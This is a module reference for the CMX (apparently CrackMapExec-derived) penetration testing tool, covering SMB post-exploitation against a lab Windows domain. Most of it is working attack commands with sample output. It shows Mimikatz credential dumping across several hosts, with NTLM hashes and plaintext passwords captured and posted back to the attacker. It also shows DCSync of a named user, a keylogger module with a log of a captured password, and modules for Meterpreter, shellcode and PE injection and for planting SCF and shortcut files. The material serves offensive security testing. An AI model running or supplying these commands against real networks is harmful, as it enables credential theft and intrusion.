# SMB: Modules Reference
Created by: @awsmhacks  
Updated: 8/20/19   
CMX Version: 5.0.1
  

**Notes:**  
* The following examples assume you have a Kali Linux host connected to an internal network.    
* For the examples it is also assumed hosts are within a 192.168.1.0/24 IP space.   
* If CMX isnt giving output of anykind, you probably have something wrong with the command.   
  
  
Modules:  
[Mimikatz](#mimikatz)

----------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------

# Using Modules

## List available SMB modules
Returns a list of loaded modules. The protocol can be replaced, i.e. {smb, winrm}
```
~# cmx smb -L
```
**Expected Results:**
```
[*] enum_av                   Enum AV products on the the remote host(s) via WMI
[*] getcompdetails            Enumerates sysinfo
[*] kerberoast                Kerberoasts all found SPNs for the current domain
[*] mimikatz                  Dumps all logon credentials from memory
```

----------------------------------------------------------------------------------------------------
## List Module Options
Returns options specific to a module
```
~# cmx smb -M <module_name> --options
```
```
~# cmx smb -M mimikatz --options

[*] mimikatz module options:

    Module Options:
           COMMAND  Mimikatz command to execute (default: 'privilege::debug sekurlsa::logonpasswords exit')

cmx --verbose smb 192.168.1.1 -u username -p password -M mimikatz -mo COMMAND='privilege::debug sekurlsa::logonpasswords exit'

```

----------------------------------------------------------------------------------------------------
## Specifying Module Options
Module options are specified using -mo after the module name  
All options should be specified in the form KEY=VALUE  
When using several options, seperate with a space  
    i.e -mo KEY=VALUE KEY=VALUE KEY=VALUE  
```
~# cmx smb -M <module_name> -mo KEY=VALUE [KEY=VALUE] [KEY=VALUE]

cmx --verbose smb 192.168.1.1 -u username -p password -M mimikatz -mo COMMAND='privilege::debug sekurlsa::logonpasswords exit'
```

----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------



# Module Commands Reference
----------------------------------------------------------------------------------------------------
## mimikatz      
Executes Invoke-Mimikatz.ps1 script.
This contains the full functionality of mimikatz.  
I'll try to keep this up-to-date with new releases  

If it isnt up-to-date you can recompile the Invoke-Mimikatz script yourself using the included Invoke-UpdateMimikatzScript
See that script itself for information on how-to  

Tested on Window 7, Windows 2012, Windows 10-(1804, 1809, 1904), Windows 2016    
Windows 10.0 Build 18362 x64  
Windows 10.0 Build 17763 x64   
Windows Server 2012 R2 Datacenter 9600 x64  
Windows 6.1 Build 7601 x64  
Windows 7 Ultimate 7601 Service Pack 1 x64   
  
| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | true        | false       | true*      | 

**Options:**
```
For a full list of options see https://github.com/gentilkiwi/mimikatz/wiki
```
**Example Usages:**
Single Target:  
```
~# cmx smb 10.10.33.104 -u Administrator -p AdminSuper\!23 -M mimikatz

Sep.02.19 14:16:34  SMB         10.10.33.104:445  DESKTOP-HVIF7F2 [*] Windows 10.0 Build 18362 x64 (domain:OCEAN) (signing:False) (SMBv:3.0)
Sep.02.19 14:16:34  SMB         10.10.33.104:445  DESKTOP-HVIF7F2 [+] OCEAN\Administrator:AdminSuper!23 (Pwn3d!) 
			[!] Sleeping to allow defender process to finish shutting down[!] 
Sep.02.19 14:16:43  MIMIKATZ    10.10.33.104:445          [+] Executed launcher
Sep.02.19 14:16:43  MIMIKATZ                         [*] Waiting on 1 host(s)
Sep.02.19 14:16:44  MIMIKATZ    10.10.33.104         [*] - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
Sep.02.19 14:16:55  MIMIKATZ    10.10.33.104         [*] - - "POST / HTTP/1.1" 200 -
Sep.02.19 14:16:55  MIMIKATZ    10.10.33.104         ocean.depth\DESKTOP-HVIF7F2$:7e879d549ad5b820267e39f488cc5020
Sep.02.19 14:16:55  MIMIKATZ    10.10.33.104         [+] Added 1 credential(s) to the database
Sep.02.19 14:16:55  MIMIKATZ    10.10.33.104         [*] Saved raw Mimikatz output to /root/.cmx/logs/Mimikatz_against_10.10.33.104_on_Sep.02.19_at_1416.log

```

Multiple Targets:  
```
~# cmx smb 10.10.33.122-125 -u Administrator -p AdminSuper\!23 -M mimikatz

Sep.02.19 14:11:51  SMB         10.10.33.124:445  WIN7P-PC [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Sep.02.19 14:11:51  SMB         10.10.33.122:445  SERVER2012-2 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Sep.02.19 14:11:51  SMB         10.10.33.123:445  WIN7E-PC [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:False) (SMBv:2.1)
Sep.02.19 14:11:51  SMB         10.10.33.125:445  WIN10E  [*] Windows 10.0 Build 17763 x64 (domain:OCEAN) (signing:False) (SMBv:3.0)
Sep.02.19 14:11:51  SMB         10.10.33.124:445  WIN7P-PC [+] OCEAN\Administrator:AdminSuper!23 (Pwn3d!)
Sep.02.19 14:11:51  SMB         10.10.33.123:445  WIN7E-PC [+] OCEAN\Administrator:AdminSuper!23 (Pwn3d!)
Sep.02.19 14:11:51  SMB         10.10.33.125:445  WIN10E  [+] OCEAN\Administrator:AdminSuper!23 (Pwn3d!)
Sep.02.19 14:11:51  SMB         10.10.33.122:445  SERVER2012-2 [+] OCEAN\Administrator:AdminSuper!23 (Pwn3d!)
            [!] Sleeping to allow defender process to finish shutting down[!] 
            [!] Sleeping to allow defender process to finish shutting down[!] 
            [!] Sleeping to allow defender process to finish shutting down[!] 
            [!] Sleeping to allow defender process to finish shutting down[!] 
Sep.02.19 14:12:00  MIMIKATZ    10.10.33.125:445          [+] Executed launcher
Sep.02.19 14:12:00  MIMIKATZ    10.10.33.122:445          [+] Executed launcher
Sep.02.19 14:12:01  MIMIKATZ    10.10.33.122         [*] - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
Sep.02.19 14:12:01  MIMIKATZ    10.10.33.125         [*] - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
Sep.02.19 14:12:01  MIMIKATZ    10.10.33.124:445          [+] Executed launcher
Sep.02.19 14:12:01  MIMIKATZ    10.10.33.123:445          [+] Executed launcher
Sep.02.19 14:12:01  MIMIKATZ                         [*] Waiting on 4 host(s)
Sep.02.19 14:12:01  MIMIKATZ    10.10.33.123         [*] - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
Sep.02.19 14:12:02  MIMIKATZ    10.10.33.124         [*] - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
Sep.02.19 14:12:08  MIMIKATZ    10.10.33.122         [*] - - "POST / HTTP/1.1" 200 -
Sep.02.19 14:12:08  MIMIKATZ    10.10.33.122         ocean.depth\ozzy:9ae52054b53d771c62414f93ed0a2599
Sep.02.19 14:12:08  MIMIKATZ    10.10.33.122         ocean.depth\SERVER2012-2$:73669c2ca02b7e0e210e6cf54022cd3d
Sep.02.19 14:12:08  MIMIKATZ    10.10.33.122         ocean.depth\SERVER2012-2$:fe39fa61cb8e68ee08ee24e753b44f39
Sep.02.19 14:12:08  MIMIKATZ    10.10.33.122         [+] Added 3 credential(s) to the database
Sep.02.19 14:12:08  MIMIKATZ    10.10.33.122         [*] Saved raw Mimikatz output to /root/.cmx/logs/Mimikatz_against_10.10.33.122_on_Sep.02.19_at_1412.log
Sep.02.19 14:12:12  MIMIKATZ    10.10.33.125         [*] - - "POST / HTTP/1.1" 200 -
Sep.02.19 14:12:12  MIMIKATZ    10.10.33.125         ocean.depth\agrande:bbc2bf2fbca9dd9ed74d3c1b55e3d727
Sep.02.19 14:12:12  MIMIKATZ    10.10.33.125         ocean.depth\WIN10E$:fd87354e5df9e43d123506286e11897b
Sep.02.19 14:12:12  MIMIKATZ    10.10.33.125         ocean.depth\WIN10E$:17e1af1da99cdb1a22561f3b50582d1d
Sep.02.19 14:12:12  MIMIKATZ    10.10.33.125         [+] Added 3 credential(s) to the database
Sep.02.19 14:12:12  MIMIKATZ    10.10.33.125         [*] Saved raw Mimikatz output to /root/.cmx/logs/Mimikatz_against_10.10.33.125_on_Sep.02.19_at_1412.log
Sep.02.19 14:12:16  MIMIKATZ                         [*] Waiting on 2 host(s)
Sep.02.19 14:12:16  MIMIKATZ    10.10.33.123         [*] - - "POST / HTTP/1.1" 200 -
Sep.02.19 14:12:16  MIMIKATZ    10.10.33.123         ocean.depth\agrande:bbc2bf2fbca9dd9ed74d3c1b55e3d727
Sep.02.19 14:12:16  MIMIKATZ    10.10.33.123         ocean.depth\WIN7E-PC$:2d3b04ef5f2dee295d2ba35ab55e2147
Sep.02.19 14:12:16  MIMIKATZ    10.10.33.123         ocean.depth\agrande:User!23
Sep.02.19 14:12:16  MIMIKATZ    10.10.33.123         [+] Added 3 credential(s) to the database
Sep.02.19 14:12:16  MIMIKATZ    10.10.33.123         [*] Saved raw Mimikatz output to /root/.cmx/logs/Mimikatz_against_10.10.33.123_on_Sep.02.19_at_1412.log
Sep.02.19 14:12:17  MIMIKATZ    10.10.33.124         [*] - - "POST / HTTP/1.1" 200 -
Sep.02.19 14:12:17  MIMIKATZ    10.10.33.124         ocean.depth\agrande:bbc2bf2fbca9dd9ed74d3c1b55e3d727
Sep.02.19 14:12:17  MIMIKATZ    10.10.33.124         ocean.depth\WIN7P-PC$:9cc6214e9e6a11545ce2a1a91cd393e8
Sep.02.19 14:12:17  MIMIKATZ    10.10.33.124         ocean.depth\agrande:User!23
Sep.02.19 14:12:17  MIMIKATZ    10.10.33.124         (null)\Administrator:AdminSuper!23
Sep.02.19 14:12:17  MIMIKATZ    10.10.33.124         (null)\agrande:User!23
Sep.02.19 14:12:17  MIMIKATZ    10.10.33.124         [+] Added 5 credential(s) to the database
Sep.02.19 14:12:17  MIMIKATZ    10.10.33.124         [*] Saved raw Mimikatz output to /root/.cmx/logs/Mimikatz_against_10.10.33.124_on_Sep.02.19_at_1412.log

```
  
*When using multiple commands, spaces are used as the delimeter.*  
To issue commands with spaces in them, nest them inside quotes:  
i.e to use `kerberos::list /export` becomes `privilege::debug "kerberos::list /export" exit`
```
~# cmx smb 10.10.33.123 -u agrande -p User\!23 -M mimikatz -mo COMMAND='privilege::debug "kerberos::list /export" exit'
```

DCSync a specific user:
```
~# cmx smb 10.10.33.123 -u Administrator -p AdminSuper\!23 -M mimikatz -mo COMMAND='privilege::debug "lsadump::dcsync /user:OCEAN\\mbellamy " exit'
```

Output will be jumbled for results other than the default, but the full, well formated results are  
saved to a log file. 


----------------------------------------------------------------------------------------------------
## enum_av          
Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI

**Options:**
None

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | true        | false       | true*      |


**Example Usage:**
```
~# cmx smb 10.10.33.123 -u agrande -p User\!23 -M enum_av
```
**Expected Results:**
(This was ran against a host running Windows Defender)
```
Aug.30.19 13:14:30  SMB         10.10.33.123:445  WIN7E-PC [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.30.19 13:14:30  SMB         10.10.33.123:445  WIN7E-PC [+] OCEAN\agrande:User!23 (Pwn3d!)
Aug.30.19 13:14:31  ENUM_AV     10.10.33.123:445          [+] Found Anti-Spyware product:
Aug.30.19 13:14:31  ENUM_AV     10.10.33.123:445          instanceGuid => {D68DDC3A-831F-4fae-9E44-DA132C1ACF46}
Aug.30.19 13:14:31  ENUM_AV     10.10.33.123:445          displayName => Windows Defender
Aug.30.19 13:14:31  ENUM_AV     10.10.33.123:445          pathToSignedProductExe => %ProgramFiles%\Windows Defender\MSASCui.exe
Aug.30.19 13:14:31  ENUM_AV     10.10.33.123:445          pathToSignedReportingExe => %SystemRoot%\System32\svchost.exe
Aug.30.19 13:14:31  ENUM_AV     10.10.33.123:445          productState => 393488

```

----------------------------------------------------------------------------------------------------

## bloodhound 

Removed: I recommend just using [bloodhound.py](https://github.com/fox-it/BloodHound.py)
































.  
.  
.    
.  
.    
.  
.    
.  
.    
.  
.    
.  
.    
.  
.    
.  
.    
.  
.    
.  
.    
.  
.    
.  
.    
.  
.    
# old modules not supported

--------------------------------------------------------------------------------------------------------------------------------------------------------
## enum_chrome
### not currently working due to command length limits see https://github.com/byt3bl33d3r/CrackMapExec/issues/223
Decrypts saved Chrome passwords using Get-ChromeDump

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
None

**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M enum_chrome
```
**Expected Results:**
```
~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## enum_dns  
Uses WMI to dump DNS from an AD DNS Server.
The target must be a domain controller(s) and you must be running with DA or equivalant credentials

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true  

**Options:**
```
        DOMAIN      Domain to enumerate DNS for. Defaults to all zones.
```
Suggest leaving DOMAIN blank and it will attempt to find all domains.  
See "Domains Retrieved" in the example.  
**Example Usage:**
```
~# cmx smb 192.168.1.110 -u Administrator -p 'AAdmin!23' -M enum_dns
```
**Expected Results:**
```
SMB         192.168.1.110    445    DC2016A          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC2016A) (domain:PACIFIC) (signing:True) (SMBv1:True)
SMB         192.168.1.110    445    DC2016A          [+] PACIFIC\Administrator:AAdmin!23 (Pwn3d!)
ENUM_DNS    192.168.1.110    445    DC2016A          [+] Domains retrieved: ['_msdcs.ocean.depth', 'pacific.ocean.depth']
ENUM_DNS    192.168.1.110    445    DC2016A          Results for _msdcs.ocean.depth
ENUM_DNS    192.168.1.110    445    DC2016A          Record Type: CNAME
ENUM_DNS    192.168.1.110    445    DC2016A              d4c78a2d-50c2-412c-ba64-19cf8794dac4._msdcs.ocean.depth: dc2012a.ocean.depth.
ENUM_DNS    192.168.1.110    445    DC2016A              f9cc19ac-1af0-4438-8017-eae79dcbe1fd._msdcs.ocean.depth: dc2016a.pacific.ocean.depth.
ENUM_DNS    192.168.1.110    445    DC2016A          Record Type: NS
ENUM_DNS    192.168.1.110    445    DC2016A              _msdcs.ocean.depth: dc2012a.ocean.depth.
ENUM_DNS    192.168.1.110    445    DC2016A              _msdcs.ocean.depth: dc2016a.pacific.ocean.depth.
ENUM_DNS    192.168.1.110    445    DC2016A          Record Type: SOA
ENUM_DNS    192.168.1.110    445    DC2016A              _msdcs.ocean.depth: dc2016a.pacific.ocean.depth. hostmaster.ocean.depth.  8811 900 600 86400 3600
ENUM_DNS    192.168.1.110    445    DC2016A          Results for pacific.ocean.depth
ENUM_DNS    192.168.1.110    445    DC2016A          Record Type: A
ENUM_DNS    192.168.1.110    445    DC2016A              DESKTOP2.pacific.ocean.depth: 10.10.33.122
ENUM_DNS    192.168.1.110    445    DC2016A              Desktop3.pacific.ocean.depth: 192.168.1.121
ENUM_DNS    192.168.1.110    445    DC2016A              SERVER1.pacific.ocean.depth: 10.10.33.111
ENUM_DNS    192.168.1.110    445    DC2016A              SERVER2.pacific.ocean.depth: 10.10.33.112
ENUM_DNS    192.168.1.110    445    DC2016A              dc2016a.pacific.ocean.depth: 192.168.1.110
ENUM_DNS    192.168.1.110    445    DC2016A              pacific.ocean.depth: 192.168.1.110
ENUM_DNS    192.168.1.110    445    DC2016A          Record Type: NS
ENUM_DNS    192.168.1.110    445    DC2016A              pacific.ocean.depth: dc2016a.pacific.ocean.depth.
ENUM_DNS    192.168.1.110    445    DC2016A          Record Type: SOA
ENUM_DNS    192.168.1.110    445    DC2016A              pacific.ocean.depth: dc2016a.pacific.ocean.depth. hostmaster.pacific.ocean.depth.  464 900 600 86400 3600
ENUM_DNS    192.168.1.110    445    DC2016A          [*] Saved raw output to DNS-Enum-192.168.1.110-2018-11-28_173000.log

~# 
```
Output files are saved to /root/.cmx/logs/

--------------------------------------------------------------------------------------------------------------------------------------------------------
## get_keystrokes   
Executes PowerSploit's Get-Keystrokes script  
Needs to be killed manually after recieving the Got Keys! message  
using Ctrl+C  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
*   TIMEOUT   Specifies the interval in minutes to capture keystrokes.
    STREAM    Specifies whether to stream the keys over the network (default: False)
    POLL      Specifies the interval in seconds to poll the log file (default: 20)
```
**Example Usage:**
```
~# cmx smb 192.168.1.110 -u Administrator -p 'AAdmin!23' -M get_keystrokes -o TIMEOUT=2
```
**Expected Results:**
```
GET_KEYS...                                         [*] This module will not exit until CTRL-C is pressed
GET_KEYS...                                         [*] Keystrokes will be stored in ~/.cmx/logs

SMB         192.168.1.110    445    DC2016A          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC2016A) (domain:PACIFIC) (signing:True) (SMBv1:True)
SMB         192.168.1.110    445    DC2016A          [+] PACIFIC\Administrator:AAdmin!23 (Pwn3d!)
GET_KEYS... 192.168.1.110    445    DC2016A          [+] Executed launcher
GET_KEYS... 192.168.1.110                            [*] - - "GET /Invoke-PSInject.ps1 HTTP/1.1" 200 -
GET_KEYS... 192.168.1.110                            [*] - - "GET /Get-Keystrokes.ps1 HTTP/1.1" 200 -
GET_KEYS... 192.168.1.110    445    DC2016A          [+] Got keys! Stored in /root/.cmx/logs/get_keystrokes_192.168.1.110/keys_Administrator.log
^CKeyboardInterrupt
2018-11-29T20:29:28Z
```
**Results File:**
Output files are saved to /root/.cmx/logs/get_keystrokes_\<targetIP\>/  
Results are of the form:  
"Key pressed","username: application","date"  
Below example grabbed the Administrator typing "ssh root@10.10.10.10" the "p@ssword!"  
```
~# cat /root/.cmx/logs/get_keystrokes_192.168.1.110/keys_Administrator.log

��"TypedKey","WindowTitle","Time"
"<Enter>","Administrator: Command Prompt","11/29/2018 12:32:24 PM"
"<Enter>","Administrator: Command Prompt","11/29/2018 12:32:24 PM"
"s","Administrator: Command Prompt","11/29/2018 12:32:25 PM"
"s","Administrator: Command Prompt","11/29/2018 12:32:25 PM"
"h","Administrator: Command Prompt","11/29/2018 12:32:25 PM"
"< >","Administrator: Command Prompt","11/29/2018 12:32:25 PM"
"r","Administrator: Command Prompt","11/29/2018 12:32:26 PM"
"o","Administrator: Command Prompt","11/29/2018 12:32:26 PM"
"o","Administrator: Command Prompt","11/29/2018 12:32:26 PM"
"t","Administrator: Command Prompt","11/29/2018 12:32:26 PM"
"<Shift>","Administrator: Command Prompt","11/29/2018 12:32:27 PM"
"@","Administrator: Command Prompt","11/29/2018 12:32:28 PM"
"1","Administrator: Command Prompt","11/29/2018 12:32:28 PM"
"0","Administrator: Command Prompt","11/29/2018 12:32:28 PM"
".","Administrator: Command Prompt","11/29/2018 12:32:29 PM"
"1","Administrator: Command Prompt","11/29/2018 12:32:29 PM"
"0","Administrator: Command Prompt","11/29/2018 12:32:29 PM"
".","Administrator: Command Prompt","11/29/2018 12:32:29 PM"
"1","Administrator: Command Prompt","11/29/2018 12:32:29 PM"
"0","Administrator: Command Prompt","11/29/2018 12:32:30 PM"
".","Administrator: Command Prompt","11/29/2018 12:32:31 PM"
"1","Administrator: Command Prompt","11/29/2018 12:32:31 PM"
"0","Administrator: Command Prompt","11/29/2018 12:32:31 PM"
"<Enter>","Administrator: Command Prompt","11/29/2018 12:32:32 PM"
"p","Administrator: Command Prompt","11/29/2018 12:32:34 PM"
"<Shift>","Administrator: Command Prompt","11/29/2018 12:32:34 PM"
"@","Administrator: Command Prompt","11/29/2018 12:32:34 PM"
"s","Administrator: Command Prompt","11/29/2018 12:32:35 PM"
"s","Administrator: Command Prompt","11/29/2018 12:32:35 PM"
"w","Administrator: Command Prompt","11/29/2018 12:32:36 PM"
"o","Administrator: Command Prompt","11/29/2018 12:32:36 PM"
"r","Administrator: Command Prompt","11/29/2018 12:32:36 PM"
"d","Administrator: Command Prompt","11/29/2018 12:32:36 PM"
"<Shift>","Administrator: Command Prompt","11/29/2018 12:32:36 PM"
"!","Administrator: Command Prompt","11/29/2018 12:32:36 PM"
"<Enter>","Administrator: Command Prompt","11/29/2018 12:32:37 PM"
~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## get_netdomaincontroller
### not currently working due to command length limits see https://github.com/byt3bl33d3r/CrackMapExec/issues/223  
Enumerates all domain controllers  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
    INJECT    If set to true, this allows PowerView to work over 'stealthier' execution methods which have non-interactive contexts (e.g. WMI) (default: True)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M get_netdomaincontroller
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## get_netrdpsession 
### not currently working due to command length limits see https://github.com/byt3bl33d3r/CrackMapExec/issues/223          
Enumerates all active RDP sessions  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true  

**Options:**
```
    INJECT    If set to true, this allows PowerView to work over 'stealthier' execution methods which have non-interactive contexts (e.g. WMI) (default: True)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M get_netrdpsession
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## get_timedscreenshot  
### not currently working due to command length limits see https://github.com/byt3bl33d3r/CrackMapExec/issues/223    
Executes PowerSploit's Get-TimedScreenshot script  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true  

**Options:**
```
*   INTERVAL  Specifies the interval in seconds between taking screenshots.
*   ENDTIME   Specifies when the script should stop running in the format HH:MM (Military Time).
```

**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M get_timedscreenshot -o INTERVAL=30 ENDTIME=16:04
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## gpp_autologin             
Searches the domain controller for registry.xml to find autologon information and returns the username and password.  
Target needs to be a Domain Controller? (Only way it worked for me)

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
True | True | True | True 

**Options:**
```
```

**Example Usage:**
```
~# cmx smb 192.168.1.110 -u Administrator -p 'AAdmin!23' -M gpp_autologin
```
**Expected Results:**
```
SMB         192.168.1.110    445    DC2016A          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC2016A) (domain:PACIFIC) (signing:True) (SMBv1:True)
SMB         192.168.1.110    445    DC2016A          [+] PACIFIC\Administrator:AAdmin!23 (Pwn3d!)
GPP_AUTO... 192.168.1.110    445    DC2016A          [+] Found SYSVOL share
GPP_AUTO... 192.168.1.110    445    DC2016A          [*] Searching for Registry.xml
~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## gpp_password              
Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.  
Target needs to be a Domain Controller? (Only way it worked for me)

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | true | true 

**Options:**
```
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M gpp_password
```
**Expected Results:**
```
SMB         192.168.1.110    445    DC2016A          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC2016A) (domain:PACIFIC) (signing:True) (SMBv1:True)
SMB         192.168.1.110    445    DC2016A          [+] PACIFIC\Administrator:AAdmin!23 (Pwn3d!)
GPP_PASS... 192.168.1.110    445    DC2016A          [+] Found SYSVOL share
GPP_PASS... 192.168.1.110    445    DC2016A          [*] Searching for potential XML files containing passwords
~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## invoke_sessiongopher      
Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher  

Multiple_Host | Requires LA | Requires DA 
|---|---|---|
true | true | false 

**Options:**
```
    THOROUGH   Searches entire filesystem for certain file extensions (default: False)
    ALLDOMAIN  Queries Active Direcotry for a list of all domain-joined computers and runs SessionGopher against all of them (default: False)    
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M invoke_sessiongopher
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## invoke_vnc                
Injects a VNC client in memory

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
    CONTYPE   Specifies the VNC connection type, choices are: reverse, bind (default: reverse).
    PORT      VNC Port (default: 5900)
    PASSWORD  Specifies the connection password.
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M invoke_vnc
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## met_inject                
Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true  

**Options:**
```
    LHOST    IP hosting the handler
    LPORT    Handler port
    PAYLOAD  Payload to inject: reverse_http or reverse_https (default: reverse_https)
    PROCID   Process ID to inject into (default: current powershell process)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M met_inject
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------------------------------------------------------------------------
## mimikatz_enum_chrome      
Executes PowerSploit's Invoke-Mimikatz.ps1 script (Mimikatz's DPAPI Module) to decrypt saved Chrome passwords  
        Pros and cons vs the standard enum_chrome module:  
            + Opsec safe, doesn't touch disk  
            - Tends to error out and/or not decrypt all stored credentials (not sure why exactly, should work perfectly in theory)  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true  

**Options:**
```

```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M mimikatz_enum_chrome
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## mimikatz_enum_vault_creds 
Executes PowerSploit's Invoke-Mimikatz.ps1 script and decrypts stored credentials in Windows Vault/Credential Manager

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```

```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M mimikatz_enum_vault_creds
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## mimikittenz               
Executes the Mimikittenz script

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```

```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M mimikittenz
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## multirdp                  
Patches terminal services in memory to allow multiple RDP users

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```

```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M multirdp
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## netripper                 
Injects NetRipper in memory using PowerShell  
        Note: NetRipper doesn't support injecting into x64 processes yet, which very much limits its use case  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
*   PROCESS   Process to hook, only x86 processes are supported by NetRipper currently 
                (Choices: firefox, chrome, putty, winscp, outlook, lync) 
```
*Fails for chrome currently*

**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M netripper -o PROCESS=firefox
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## pe_inject                 
Downloads the specified DLL/EXE and injects it into memory using PowerSploit's Invoke-ReflectivePEInjection.ps1 script  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | False 

**Options:**
```
    PATH     Path to dll/exe to inject
    PROCID   Process ID to inject into (default: current powershell process)
    EXEARGS  Arguments to pass to the executable being reflectively loaded (default: None)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M pe_inject 
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## rdp                       
Enables/Disables RDP  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | False  

**Options:**
```
    ACTION  Enable/Disable RDP (choices: enable, disable)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M rdp
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## scuffy                    
Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | False 

**Options:**
```
    SERVER      IP of the SMB server
    NAME        SCF file name
    CLEANUP     Cleanup (choices: True or False)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M scuffy
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## shellcode_inject          
Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
    PATH     Path to the file containing raw shellcode to inject
    PROCID   Process ID to inject into (default: current powershell process)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M shellcode_inject
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## slinky                    
Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | False 

**Options:**
```
    SERVER        IP of the SMB server
